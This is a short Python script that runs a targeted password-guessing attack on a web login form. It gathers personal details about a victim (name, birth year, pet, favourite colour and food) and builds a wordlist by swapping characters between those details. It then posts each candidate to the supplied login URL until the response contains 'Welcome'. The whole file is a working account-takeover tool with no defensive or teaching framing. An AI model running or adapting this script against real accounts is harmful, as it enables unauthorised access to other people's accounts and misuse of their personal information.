import requests
from itertools import combinations

url = input("Enter the URL of the login page: ")
username = input("Enter the username or email: ")

password1 = input("Enter the name of the person: ")
password2 = input("Enter the last name of the person: ")
password3 = input("Enter the year the person was born: ")
password4 = input("Enter the name of the person's pet: ")
password5 = input("Enter the name of the person's favorite color: ")
password6 = input("Enter the name of the person's favorite food: ")

passwords = [password1, password2, password3, password4, password5, password6]
new_passwords = set(passwords)
for p1, p2 in combinations(passwords, 2):
    for i in range(min(len(p1), len(p2))):
        # Swap characters at position i
        p1_new = p1[:i] + p2[i] + p1[i+1:]
        p2_new = p2[:i] + p1[i] + p2[i+1:]
        new_passwords.add(p1_new)
        new_passwords.add(p2_new)
with open("passwords.txt", "w") as f:
    for pw in new_passwords:
        f.write(pw + "\n")
print("Generated mixed passwords and saved to passwords.txt.")
with open("passwords.txt", "r") as f:
    for password in f:
        password = password.strip()
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        if "Welcome" in response.text:
            print(f"[+] Password found: {password}")
            break